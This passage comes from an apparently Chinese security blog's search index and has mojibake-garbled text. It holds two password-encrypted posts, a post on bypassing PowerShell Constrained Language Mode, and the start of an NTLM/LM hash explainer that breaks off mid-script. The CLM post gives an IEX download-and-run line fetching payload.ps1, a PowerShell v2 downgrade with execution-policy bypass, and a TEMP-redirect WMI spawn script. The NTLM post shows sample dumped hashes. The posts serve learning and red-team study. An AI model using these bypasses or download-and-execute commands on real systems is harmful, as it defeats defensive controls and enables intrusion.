4f317625ad8925d52be23e1312a671ff9e57730a24b51cf2733363fb056ed630d06481d381b5d7daed59d0d715ba63bb32788f4dfc0a081cc6fdc96b9ba4a25b9cce4f580bba1a46b1323832f89c1af5c62911984afedcf6ed187d596dfe63154a8118cf05d73683da09d85bd764f33d7fbd8ffdb3135d30996c009792e4b918a5579f702a44277276078b86063bffab8479760442ad5a1684aa64c1b70278fd7a2f23534ca910e255f9793a198c8128ccbe7654d4b2acd9ed65dce80bbbf4ceec1b21af8ae858e45de66458a327d12754bae63b2ab2f1c922822219da1554ca3f71b617b247fbed9b72ef5b9cd1fbfbe171786e876c84f8d103a6806834bf38149d990233344957e59a461965f91c4ff23d97db0fbe81a02f5d0565cd2b157005e468ce14eba8a43dc8022a1032f74ed2d19d42e5387c72b37eb3e3f3b62c403896d8e4d5d5a510d434d0b3786fecb4df48b4aa8a316d757e118ea83324bc963a6df098c054ddb240902983db82730fbd98006a8d2838f0cd158dd49ac8938f24781fec26ec1b2e826f3ed830b474dc95bf5d3d7e4f08c8ff2b18e07687fa6620dbcb38372d4392cef35d1f36f7207575c4fb7d5bfe88149e1e4504930ddb5ac7514747dbcedb566e4fa2e8b6e31698e4902d6a113a1ccafb051813a92c054bb1f444d0cb4e393a93133cbf3378e3d0f1379b8af06c68fc6a50c620759232aaa5dae59f18508aa7be8c97a494d167f6174dee582bf7807ee21fc829b11f56fc75bf4ce0742727af2adf327fdc658d7b23e366e2c02d775411fca47c4f33e2b67129951a2d3bf45ff7506159e8ad2242ea423fb838a727e3532661da51173474346830b005ad13035f9a674f4ca86cc64ef8afdf0e3b3cc47dae321e5a811bbbe56960d4f9de567deb2c6a78b7a665eebcad4ea113bf4563fc37840f779f0c94dbc87811b43594b29e78780482dffef9f0cb660b15fa9d0b45980ad7f0c418764e2de3d3cd0b1f9bc7dfacf5b74598534763aa969b1e26ce67de1a0c2b44c62e59175faf23807cf06672ac3e83715c29f49a3341980c0f2e97a61ba87574b314e083c84cf66cc1999469e8424e1857770b8c7bb666af0d22ddd900af959b0dc7f1ac50cd13ebe207701947b23e778c4cde08dee813fe1f535b62fd0c992cdac91fa27db7de781b9a5bf45b37441317e4bfd813a9611b49bd7091bb7fdd5c056190602461743c82b7aae5b15066ecc15170955de807da9ab41cb6667da95b42312b37695f69907c416705f3c2e72bafdab3d8c09834a86db7dde6a3cc17a6e351b1f67d64aa4fe80be38a7e250596a454a8826bb3f9a2b5b0a1e6822584b886b70dea9c84d8e7ab8eea627928cae2b143e347fa37eb328e8bf423ae6667cb43b996b423112ac0641ec83422f465d80fdbfdf0ee6eeedbfc865b333faed65ecc49332e188ac58594a366b8a23ed54841a83fa725dfd27f7ed0493956545d4b6c3b4fc3fca398def8f6b0b4a6d8d972a677d5bc65332da9ea4221d7109052aeea3eb62d60fa01a9c6faae3e07b7c0ec73943bf9f4e6d2cfc5b5f8e406cfe0afdafb5ada3c41706c78f2c5a8165d10e30f2f9bd408b7ed90101e2b12075dd9622d7648c1c77a11c80b5218acdb4b6f29e25c968c17367c75ee4a08c92c450d9b2071b9f554acbced40106aefbffdf7a26f89e423d9d525c</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>è®°ä¸€æ¬¡çº¢é˜Ÿååæ€ä¸æ€»ç»“</title>
    <url>/posts/457578e1/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="49571d624cb54a0761437fc846857e292468fd392cfe5038ea1290564dd0950d">de64d47ec3cf90f53a7fdcf21575326eb3e38821bd54060a735255ca2e823765ff5121452d011811d33c3cc2bada91ae6b69bf6f498c42bba8a2dfd48dd6857a6bac46779c711f9a4fe1ac2a7cde85dd034e3ca13d22204185e0542a02bdb79d3bbf4ee8027f9136639290f24b38826f6c029d388d505dbf3df2277760ddd045fb2a7813c2ae2a7f764005bf3ad13bf2d3511d05de9cc95be4fa09f768fa450d21bd948e37d3efc983335a97be941d16c532c0b7e1d2bd7a11d3b0c93e641fb6eda1b02d308dfdf8ea6c3b020e072f566501ad5a6663e9d5fd0a1dacbf6ca7af0cb83abdc505742573deee796eca2699506246e12a9b7576c1371b4274f5131c974eb840c4af12425005880741178ebd5275e9954fa96ab9bdf65d28c9c92314e6161582c7ff097e932ed3d2219c6b0bf5e1dfdda1651a43f193a734b30bd57baf60d9f0d140df067fa686896f7bdf1c96f137cd6e1a023191d353c8522d84025159413c58070495e30ccc7e0adff59b9be51c1a1969c097719352a989d3dd8f170405953db6738895f795a9056ecdab9fb9f933ef1a6b69b03c26df2869c6b414dc9991983421db35a7c91e850fccf2d38f595d22bab4930c86f9460da2c38baec5a4bad26c2031df6edaf3f8030050c196826b88d0ca96d7281510e1a0de47141aba40df7c3a0591f872978b5b0c24b909773e1912ba3e87cac939b9bb135a8520c8678e6636c36acd2bce755ff71c82276156e6e60342d0558049a2917e962b1d0c0e45f0e0494b5949da11c9701778ddf44fb9c916c270fe573c3576fe89ac0bfcb2da063e93f7f77de3de6970b199aa298e75d5bfc634462a0b9e8fc2eff80e8ebd7274f8ccc2e5aca65e8d22c584ce1d5ba3930f33a2d7bfb3d210999f2f17ce50c306d9c4b8dc2954f7a1df82e8d8ca84028c2b4aa2409498dabec5fe26d45aef620e9a7181040288c9007de9e23ae1e3f60d7aec20852bac375f454dc732ff80b27c2e23a51c5d9b07d824b3fc195fa965f0747d3fd525a08deca17fcf88f71178bed51c140b84e702634a0a76084fdeef34e85535b9c7d3caa313f513295ef9b97a4c2fca795f5d7fe250a027e0824e175ad23fd8a6a9aa62316dd4217ead96fdf61bd32f0b38b5734b26a45b57c89db9078f536aeb76c95f374324acf52bdf9ec3d03562767356cecf9fced6a2e1ecefacbcb6b3a5fad0f587868c39b29f1ae60c8d5d58bcf195fd60a6436be371c7fe42cbfa936c6d67fd20e8315eb66d51a06338244957987d8e604c78675975c2a150820d5c2f02e6820405d315358a48055055fbbe1e2a7d879ff10d3ec7ee77473258da45b196c17005243e393a8080549ae776554d512d845a95a0f8e8c3f560658ee9f0f313e42c3ea8a323a76174d25e3f51fed6754b98e886d23f5a0048072f196fb3e9ebbec55bb1f1bb3924568e387082a5572e153bb06124bdeb11d435d7f3f7d6c5e42f1ea3195a02ef8b8da960810af1d713901647d6f6a1630745d88731b3d2d485d3220bfa74945d9b0d3efeadca141426067805f478b292cd11ce1a4668cef8c5a7565b095ab036814ee70ff15801a12e9344d56bd84868110e95887557850550d638ee98f61d5d93bb298317e711e83a641406ceb0b915b1e0a32aba3f613ce2501610476f8e5c05998e27160e0b0b064f1b4d4e261691fa692d826743fea1c012f19feea2891e19691c3d9e4a7aea52e088e9411991678b604c63c1ae27ff017fdb17fc07c2930d6f931552270c3fac1f528bb4ecdbf7ca6a0d7cb5ba8c407e2a2f69d0b20689c25554fc14ff93e11a8f3f3de4f64071f37ac762d49c968691ef1355fbf6cd36ca52e02150f6f49a9ba5f855487feaab294b4fa91f69416265af0e1d62a158d4b2eb1806375a100ff9f8fcdaa7e1d4a250e87a312b36cb8060e5c4cd182cc1fd03090230b9ba1b24d1a4104b44c700124dd257abe410e1edda8b550095b2937df7e433311edb8355caeb1697bb3698fcfd3f55ac92150906536eeb22627f0ed78058a9e076d0274ad7eca3258d29e7f7fd42281e300930096b0329ee832225e0da0587988fc7f4601b4fc6893d5f12bc314d248bb887f48655664add5798c29b283009250c08f90fbf76c89ffe8144590701fd33d564faf830317fdca64c45687f71e48d92600be7e4980d78ccd00f3b0eb8f2504fcbc7e40d40ff39536b05f696e987c13ece0e50f46f75a7b8b2f03b628b3be4a1e1af50f2b6ebfe594df8769ab7a4cca79a886f3cc9d6080eccfde37645ddc96c2d14a6028a54838512a49b87be9a5ffe3cce9ad38148c63cb8e6ec9d463ab0d7c2525b0c4f53bfa9074f7562f43aa150c4ca1bbcb1889919aa77b94e029f077e4d705e462f9677499c31adf74472072dabe4232b7c3608cad7dd3b6fc3e76e37335d71c66c43dd9c08dafd04af0344253eef572329d675d354571633159479a4ff0744954db1de2fcc89e1ce19911e9d149597e9b491ec4cac7b1b2a966c58a3ec536f085afc412dca457cc4a14b246f69e034da5eaddd75b7710cee3ad3578052981f18736844f20fd682ff4f158291c154fc6d58ff88517f022640be7b2ac8b9779284372ae9573aa3f8246475a4e7385dc69e1ae3a427c28b53ebbf022254e88aaa0f83bfa39f247bca7383fc14117f2e7a0102e18c048a063ac8b64e698ce376134806a0b7d7a7328fe34a2b127aaabe6eea1b6cdaac9c68309711d3c41a2c4dad280720dc4dda2bad90bef83b9e9cba5037ca9731c6ee16971abbc3c0b560f99d2b2fc1b070d44d74e5c3543afdbdb2ecb2e6744350a5f4713392d6075752bee27c32e547a633defd1decc1df4c9a9d7b47545a48bfd04f102616a0ca76b9603161585917616a28e3b4da8b80cb23526dc2fbcc66b5659ce56e071fdbb1a2d3181de141db0b07026dfeadc0f24ce43de098b7221da136a660d491aa3239f4b5c4fa08c871daa20c657d52e89059cbf1e5709272841667540c58cb334d523e82916d282559ae8dd60f0c6689a1fbb4ed168f2aff652723603e86d5f4dca560f1bfc46c1152cebed03fa020bad5896da51570e3e15c94b18a19e220b3a189f2cfb654e2b6871d78564d577c813f70d0ca18caec0d0228e5ef780ad7031731ffce251f8aebeeea35dbef2d26c9a5cb8f96a9c16c01a12a71ad9178473a3ee1dd67a2ce9cb2560584357b8b61a51dc0ef33bd0e815ad3e8549b584d73c3ac2ed44f370ed4536f63137070b96712cee8b5301fe8b9a7b6f5134eb9c3ae0d14fe6f9874492e62006ad127ed6c09f9fba1d0aed384dbce30aad92613d1210160f08d00a816aeca8fd55bc7d3c380e501b80d2bb9585a3f28718cd78657d886213de5729d63d38ca697e98cc004c786ced434920b6ad5e9c8cc78586758b151c1654338ff55784515ab212431df1bf2be3b6760f7f1faa60e9cc1ea2cfc670ccce135109fd8b7d41ddb5da396be97bdd9f1014b9aef6b4df4f552ec5343dd9efec7b2ecf61be965579769181af2e1f75b639ed91411980120122b6bafcc003390eda7782334a516aafd3ebab85218cca39b8a1b49af35025ec04087ac1b5fc73501d7644e84202cfb9313c387e8d85b77de12c99a019eaa1235c7ba7ec7c20dc62dafa1d161bd6f60b04aafef5c1aed30ac01ae5d35ccd0497c4819568d2cc07bdbe3b58859d4927cab83256d932ea5b39ddc87cb4719f5d97adbc46990ef40e36d0b9c0dab4d6519a08cfe00baf94679052787e5690c340d6f21cb3040e83a67ab9babbe1444db85a3f21433f7a5b95b67e513f15aecc8631f88fd37ec8624f6b373cc0d70bddfd1d889f2b7ebd5b45219d3d9746915a99386ed207863d5c918fd1651981f92f5fe16b81e27c3310a4848cab2c636c7aab185fea67780b505e1963f41f025ed7085592eb9e07950697cb2185d68175e56aea56cb4efc3b2584ba7a3d65feb946f0f55739601990606619c7c911b198e41df1c5e3fe506291f56105defada4fa71731c1b16882ec1812fbae6c57f73fcc935775a05cddd706bcb6e2dd0273436d1929b87440d90932b225c02d1b7831d93dfb7dae09a8f5a8cfd73b620787ca67d335d20e736c95a6a48b4c3834b5fe39df7d014d5b3c35d0a2b77828f7eb215477c497586cb669b1216f6173449cc812d085f7faed75e13a99689d5e9632f623e9ea6169dd51e8ae6126653e8b06805a46de3de4901cbc989048e25975c72b8f2427cb11a08581950bc1450c940abfd522f7747023887e5966412f0c831439198728e79c28f19d8cb0970bb955995e4acab080021ff22753e01e08a4e55940ac55ad94ab441e449fe4365cba82922fec92c63994549efeac8c547ac22becc04fe9fdb167a1c3ee8101dc42148af2e625e66fe77b2fe7c7279283a37d8f9871e29f6f37745ca6b8d06cd0498d0f1fae11d3f5228539b64542bc08223769ec6c99917dc62166a1e92487762ba753d7e3af451784eeed63b89fc4884c30464709911d68910803fadc6a6916715c28e873a283b0a3da587c02e42cad61b6d1e6812e2d35583751caef29341100c58d1a3d0acec28e21a9b96856c222eb1d15da7e002739749ce1cd3791cc5f24906431057bbdb093194368d9afc333b4af21cb6356a19b189ad6fb95a588534e3e36cd310607241921801684c1fb07a6a5e125571eec13e3fef217d30365f544708914c691790209b506e9a283c2f573d9ad71dbdc69abfb1eaedd77174c0bbb92c9260fadc22ef98a5dba856503d0214293bcb2d09057a1b678dbf3b20db8193d00b344989410d512fc90b6b94250ef7578dfd04773a699d97b5cbf5f344f57a977b7b9202dcda1d86d83daddefe1f1dcaa56b8973a4414e5d5f497e355eff69ac67d4cd87e456ddb987e7ab7573d694909690cbf882f2e8707c67b872e18dc8092d2ac08eb15d5f7c7e9804149c00d55c476b09cf64844f641708fbe7a9dc20235881c884275f15c9afa4733fd8f24afa33647581721b65c1e863a0ab274f745561798d1cf8ca659afd9831bdc10a2941cfceddc18953b5b90869a4b9313459441fdb84383f948f8e614209b3c3e8129bfd877331344f227970d1e42b27244e139b33fb17d3921002610d0f9891f18e61b5feaefda0756208e5b26e262947d8b3123530717c40ec58712ed149bfde15e29890d6bd9abe4768d48966238f0acb0132294339329ca34d13b7d8c894674e9ee8d3a06ee54d168957f1747cd1421e8a0b43e6e3cee8b4000ac6021a6f0fa73808e1b50701ec06203d737155858a944fc1d182b7cfb33cc4833dee7173057925f1485b01a2085affd8e75fa0547bb7e52b19ae05675c6387d8f1a89944ba3f2bf90c4e3ac418f2f7c0251607d157cc794366744de6a2cf10a1bd4170ba6074019ae3b5f3bf1cbdd0d6004b803f293ad3727be918b65c5d7abba727b0192be2da37227bac3eda00b553b3d45e3d68521bb50cd4c621ae82d74399cd3d99011dcc2dc6ada43b0d4991d4a204714d8e478fe04f674ce6ff10f9dae6b3b5e582d438894add0bef5256b381ba0182e66327aaf6a855ea720bba9d377ec242a0f06db26959a41a72f1d1716b310e0a5285ec6eeef26763a740273f71e8208a337dbf3434762f085306dba0de9dd76e5b84f6bf4b08151ce4de1f9f77dc67c0b769b881e87557e03e745f</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>CLM Bypass</title>
    <url>/posts/39eca96/</url>
    <content><![CDATA[<h3 id="CLM"><a href="#CLM" class="headerlink" title="CLM"></a>CLM</h3><p>PowerShell Constrained Language Mode<a href="https://docs.microsoft.com/zh-cn/powershell/module/microsoft.powershell.core/about/about_language_modes?view=powershell-7.2">å—é™è¯­è¨€æ¨¡å¼</a>æ˜¯ç¼“è§£PowerShellæ”»å‡»çš„ä¸€ç§æ–¹å¼ï¼Œèƒ½å¤Ÿé˜»æ­¢æ‰§è¡Œä»»æ„æœªç­¾åçš„ä»£ç </p>
<p>æŸ¥è¯¢</p>
<p><code>$ExecutionContext.SessionState.LanguageMode</code></p>
<p>åœ¨æœ¬åœ°æŸ¥è¯¢ç»“æœä¸º<code>FullLanguage</code> å³æœªå¼€å¯çŠ¶æ€</p>
<p>å¼€å¯CLM</p>
<p><code>$ExecutionContext.SessionState.LanguageMode = &quot;ConstrainedLanguage&quot;</code></p>
<p>æµ‹è¯•è¯­å¥ </p>
<p>IEX (New-Object Net.WebClient).DownloadString.(â€˜<a href="http://192.168.0.133:8000/payload.ps1&#39;">http://192.168.0.133:8000/payload.ps1&#39;</a>)</p>
<p>å¼€å¯åä¼šå¯¹æ­¤å‘½ä»¤è¿›è¡Œæ‹¦æˆª</p>
<p><img src="/posts/39eca96/1.png"></p>
<h3 id="CLM-Bypass"><a href="#CLM-Bypass" class="headerlink" title="CLM Bypass"></a>CLM Bypass</h3><h4 id="Powershellé™çº§"><a href="#Powershellé™çº§" class="headerlink" title="Powershellé™çº§"></a>Powershellé™çº§</h4><p><code>powershell.exe -version 2</code></p>
<p><code>powershell.exe -version 2 -ExecutionPolicy bypass</code></p>
<h4 id="å†…è”æ³¨é‡Š"><a href="#å†…è”æ³¨é‡Š" class="headerlink" title="å†…è”æ³¨é‡Š"></a>å†…è”æ³¨é‡Š</h4><p><code> &amp;&#123; whoami &#125;</code></p>
<h4 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h4><p>è¿™é‡Œç›´æ¥ç…§æ¬å›½å¤–å¤§ä½¬(<a href="https://sp00ks-git.github.io/posts/CLM-Bypass/)%E7%9A%84%E4%B8%80%E4%B8%AApowershell%E5%91%BD%E4%BB%A4%EF%BC%8C%E6%89%A7%E8%A1%8C%E5%90%8E%E4%BC%9A%E6%B4%BE%E7%94%9F%E5%87%BA%E4%B8%80%E4%B8%AA%E6%96%B0%E7%9A%84powershell(%E8%BF%99%E4%B8%AA%E7%89%88%E6%9C%AC%E5%8F%AF%E4%BB%A5%E6%A0%B9%E6%8D%AE%E5%91%BD%E4%BB%A4%E8%BF%9B%E8%A1%8C%E6%9B%B4%E6%94%B9)">https://sp00ks-git.github.io/posts/CLM-Bypass/)çš„ä¸€ä¸ªpowershellå‘½ä»¤ï¼Œæ‰§è¡Œåä¼šæ´¾ç”Ÿå‡ºä¸€ä¸ªæ–°çš„powershell(è¿™ä¸ªç‰ˆæœ¬å¯ä»¥æ ¹æ®å‘½ä»¤è¿›è¡Œæ›´æ”¹)</a></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$CurrTemp</span> = <span class="variable">$env:temp</span></span><br><span class="line"><span class="variable">$CurrTmp</span> = <span class="variable">$env:tmp</span></span><br><span class="line"><span class="variable">$TEMPBypassPath</span> = <span class="string">&quot;C:\windows\temp&quot;</span></span><br><span class="line"><span class="variable">$TMPBypassPath</span> = <span class="string">&quot;C:\windows\temp&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&#x27;hkcu:\Environment&#x27;</span> <span class="literal">-Name</span> Tmp <span class="literal">-Value</span> <span class="string">&quot;<span class="variable">$TEMPBypassPath</span>&quot;</span></span><br><span class="line"><span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&#x27;hkcu:\Environment&#x27;</span> <span class="literal">-Name</span> Temp <span class="literal">-Value</span> <span class="string">&quot;<span class="variable">$TMPBypassPath</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Invoke-WmiMethod</span> <span class="literal">-Class</span> win32_process <span class="literal">-Name</span> create <span class="literal">-ArgumentList</span> <span class="string">&quot;Powershell.exe&quot;</span> </span><br><span class="line"><span class="comment">#è¿™é‡Œå¯ä»¥æ·»åŠ ç‰ˆæœ¬ä¹‹ç±»çš„å‚æ•°</span></span><br><span class="line"><span class="comment">#Invoke-WmiMethod -Class win32_process -Name create -ArgumentList &quot;Powershell.exe -Version 2 -ExecutionPolicy bypass&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">sleep</span> <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Set it back</span></span><br><span class="line"><span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&#x27;hkcu:\Environment&#x27;</span> <span class="literal">-Name</span> Tmp <span class="literal">-Value</span> <span class="variable">$CurrTmp</span></span><br><span class="line"><span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&#x27;hkcu:\Environment&#x27;</span> <span class="literal">-Name</span> Temp <span class="literal">-Value</span> <span class="variable">$CurrTemp</span></span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå¯ä»¥å¯¹ä»¥ä¸Šå‘½ä»¤è¿›è¡Œæ··æ·†</p>
<h4 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h4><blockquote>
<p><a href="https://github.com/calebstewart/bypass-clm">https://github.com/calebstewart/bypass-clm</a><br><a href="https://github.com/p3nt4/PowerShdll">https://github.com/p3nt4/PowerShdll</a><br><a href="https://github.com/iomoath/PowerShx">https://github.com/iomoath/PowerShx</a></p>
</blockquote>
<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><blockquote>
<p><a href="https://sp00ks-git.github.io/posts/CLM-Bypass/">https://sp00ks-git.github.io/posts/CLM-Bypass/</a></p>
<p><a href="https://www.secjuice.com/powershell-constrainted-language-mode-bypass-using-runspaces/">https://www.secjuice.com/powershell-constrainted-language-mode-bypass-using-runspaces/</a></p>
<p><a href="https://github.com/calebstewart/bypass-clm">https://github.com/calebstewart/bypass-clm</a></p>
<p><a href="https://blog.0x4.xyz/bypassing-windows-protection-mechanisms/constrained-language-mode-bypass">https://blog.0x4.xyz/bypassing-windows-protection-mechanisms/constrained-language-mode-bypass</a></p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>NTLMè®¤è¯&amp;NTLMRelayæ”»å‡»(æŒç»­æ›´æ–°...)</title>
    <url>/posts/5f88ecbb/</url>
    <content><![CDATA[<h2 id="LM-ä¸-NTLM"><a href="#LM-ä¸-NTLM" class="headerlink" title="LM ä¸ NTLM"></a>LM ä¸ NTLM</h2><p>Windowså¯¹ç”¨æˆ·çš„å¯†ç å‡­è¯æœ‰ä¸¤ç§åŠ å¯†ç®—æ³•ï¼Œä¹Ÿå°±æ˜¯æœ¬æ–‡å†™çš„ntlmå’Œlmã€‚åœ¨ä½¿ç”¨QuarksPwDumpæŠ“å¯†ç çš„æ—¶å€™ç»å¸¸çœ‹åˆ°å½¢å¦‚è¿™æ ·çš„hash</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin:1003:AAD3B435B51404EEAAD3B435B51404EE:111F54A2A4C0FB3D7CD9B19007809AD6:::</span><br><span class="line">Guest:501:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0:::</span><br><span class="line">Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:58EC08167E274AD52D1849DA7A3E9A81:::</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­å†’å·åˆ†å‰²çš„å‰åŠæ®µ<code>AAD3B435B51404EEAAD3B435B51404EE</code>æ˜¯lm hashï¼ŒååŠæ®µ<code>111F54A2A4C0FB3D7CD9B19007809AD6</code>æ˜¯ntlm hashã€‚å‰åŠæ®µæ”¾åˆ°cmd5è§£å¯†ä¼šå‘ç°æ˜¯ç©ºå¯†ç ï¼Œé‚£æ˜¯å› ä¸ºWindowsç‰ˆæœ¬çš„åŸå› ã€‚</p>
<p>ä¸‹é¢æ˜¯å„ä¸ªç‰ˆæœ¬å¯¹LMå’ŒNTLMçš„æ”¯æŒï¼š<br><img src="/posts/5f88ecbb/bdf41224a355f9053caecb77ca04c08a.png"><br>å…¶ä¸­<br><img src="/posts/5f88ecbb/430d26d30d8c326725b492c8806c1ca0.png"></p>
<p>ä¹Ÿå°±æ˜¯è¯´ä»Windows Vista å’Œ Windows Server 2008å¼€å§‹ï¼Œé»˜è®¤æƒ…å†µä¸‹åªå­˜å‚¨NTLM Hashï¼ŒLM Hashå°†ä¸å†å­˜åœ¨ã€‚(å› æ­¤åé¢æˆ‘ä»¬ä»‹ç»èº«ä»½è®¤è¯çš„æ—¶å€™åªä»‹ç»Net-ntlmï¼Œä¸å†ä»‹ç»net-lm)å¦‚æœç©ºå¯†ç æˆ–è€…ä¸å‚¨è“„LM Hashçš„è¯ï¼Œæˆ‘ä»¬æŠ“åˆ°çš„LM Hashæ˜¯<code>AAD3B435B51404EEAAD3B435B51404EE</code>ã€‚</p>
<p>æ¥ä¸‹æ¥å…ˆä»‹ç»è¿™ä¸¤ç§è®¤è¯çš„è®¤è¯è¿‡ç¨‹å’ŒåŠ å¯†ç®—æ³•ã€‚</p>
<h3 id="LM-Hash"><a href="#LM-Hash" class="headerlink" title="LM Hash"></a>LM Hash</h3><p>LAN Manager (LM) Hash æ—¶WIndows ç³»ç»Ÿæ‰€ç”¨çš„ç¬¬ä¸€ç§å¯†ç å“ˆå¸Œç®—æ³•ï¼Œæœ¬è´¨ä¸ºDESåŠ å¯†</p>
<h4 id="LM-Hash-ç”ŸæˆåŸç†"><a href="#LM-Hash-ç”ŸæˆåŸç†" class="headerlink" title="LM Hash ç”ŸæˆåŸç†"></a>LM Hash ç”ŸæˆåŸç†</h4><ul>
<li>  1.ç”¨æˆ·å¯†ç è½¬æ¢ä¸ºå¤§å†™ï¼Œæœ€å¤§é•¿åº¦é™åˆ¶ä¸º14ä¸ªå­—ç¬¦ï¼Œ</li>
<li>  2.å¯†ç è½¬æ¢ä¸º16è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œä¸è¶³14ä¸ªå­—èŠ‚å°†ç”¨0æ¥è¡¥å…¨</li>
<li>  3.å¯†ç çš„16è¿›åˆ¶è¢«åˆ†æˆä¸¤ä¸ª7byteéƒ¨åˆ†ï¼Œæ¯éƒ¨åˆ†è½¬æ¢æˆæ¯”ç‰¹æµï¼Œå¹¶ä¸”é•¿åº¦ä¸ºä¸º56bitï¼Œé•¿åº¦ä¸è¶³åˆ™åœ¨å·¦è¾¹ç”¨0è¡¥é½</li>
<li>  4.å†åˆ†ä¸º7bitä¸ºä¸€ç»„ï¼Œæ¯ç»„æœ«å°¾åŠ 0ï¼Œå†ç»„æˆä¸€ç»„</li>
<li>  5.å°†ä»¥ä¸Šæ­¥éª¤å¾—åˆ°çš„ä¸¤ç»„8å­—èŠ‚ç¼–ç ï¼Œåˆ†åˆ«ä½œä¸ºDESåŠ å¯†keyä¸ºé­”æœ¯å­—ç¬¦ä¸²<code>KGS!@#$%</code>è¿›è¡ŒåŠ å¯†</li>
</ul>
<p>å°† 123994 ä½¿ç”¨æ–‡æœ¬ç¼–è¾‘å™¨ è½¬æ¢ä¸ºåå…­è¿›åˆ¶</p>
<p>è½¬æ¢å ä¸º <code>313233393934</code> (12*4 bits) è€Œä¸ºäº†æ»¡è¶³14å­—èŠ‚(14 * 8 bits) åç»­å…¨éƒ½ç”¨0è¡¥å…¨</p>
<p>æ‰€ä»¥ è¡¥å…¨åçš„åå…­è¿›åˆ¶ä¸º <code>3132333939340000 0000000000000000</code></p>
<p>å°†ä»¥ä¸Šç¼–ç åˆ†è¯2ç»„7å­—èŠ‚(7*8 bits) <code>3132333939340000</code> <code>0000000000000000</code></p>
<p>å°†ä»¥ä¸Šä¸¤ç»„7å­—èŠ‚çš„åå…­è¿›åˆ¶è½¬æ¢ä¸º äºŒè¿›åˆ¶ï¼Œæ¯7bit ä¸€ç»„æœ«å°¾åŠ 0ï¼Œå†è½¬æ¢ä¸ºåå…­è¿›åˆ¶ç»„æˆçš„ä¸¤ç»„8å­—èŠ‚çš„ç¼–ç </p>
<p><code>31323339393400</code> è½¬æ¢ä¸º äºŒè¿›åˆ¶ä½</p>
<p><code>00110001001100100011001100111001001110010011010000000000</code> é•¿åº¦ä¸è¶³ä¾¿åœ¨å·¦è¾¹è¡¥0 è¿™é‡Œä»è®¡ç®—å™¨å¤åˆ¶è¿‡æ¥æ²¡æœ‰å‰é¢ä¸¤ä¸ª0</p>
<p><code>0011000 1001100 1000110 0110011 1001001 1100100 1101000 0000000</code> æ¯7ä½åˆ†ä¸ºä¸€ç»„</p>
<p><code>00110000 10011000 10001100 01100110 10010010 11001000 11010000 00000000</code> æ¯ä¸€ç»„æœ«å°¾è¡¥0</p>
<p>å°†æ¯ä¸€ç»„è½¬æ¢ä½åå…­è¿›åˆ¶</p>
<p><code>00110000 10011000 1000110 001100110 10010010 11001000 11010000 00000000</code><br><code>30 98 8C 66 92 C8 D0 00</code></p>
<p>æœ€ç»ˆå¾—åˆ° <code>30988C6692C8D000</code> åŒç† <code>00000000000000</code> (14ä¸ª0 ) å¾—åˆ° <code>0000000000000000</code>(16ä¸ª0)</p>
<p>æœ€åå†å°† ä»¥ä¸Šä¸¤ç»„8å­—èŠ‚ç¼–ç  åˆ†åˆ«ä½œä¸ºDES åŠ å¯†çš„å¯†é’¥ ä¸º é­”æœ¯å­—ç¬¦ä¸² <code>KGS!@#$%</code> è¿›è¡ŒåŠ å¯†</p>
<p>è¯¥é­”æœ¯å­—ç¬¦ä¸²è½¬æ¢ä¸º16è¿›åˆ¶ä¸º <code>4B47532140232425</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pythonå®ç°LM-HASHè„šæœ¬</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> pyDes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DesEncrypt</span>(<span class="params"><span class="built_in">str</span>, Des_Key</span>):</span><br><span class="line">    k = des(Des_Key, ECB, pad=<span class="literal">None</span>)</span><br><span class="line">    EncryptStr = k.encrypt(<span class="built_in">str</span>)</span><br><span class="line">    <span class="keyword">return</span> binascii.b2a_hex(EncryptStr)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Zero_padding</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    b = []</span><br><span class="line">    l = <span class="built_in">len</span>(<span class="built_in">str</span>)</span><br><span class="line">    num = <span 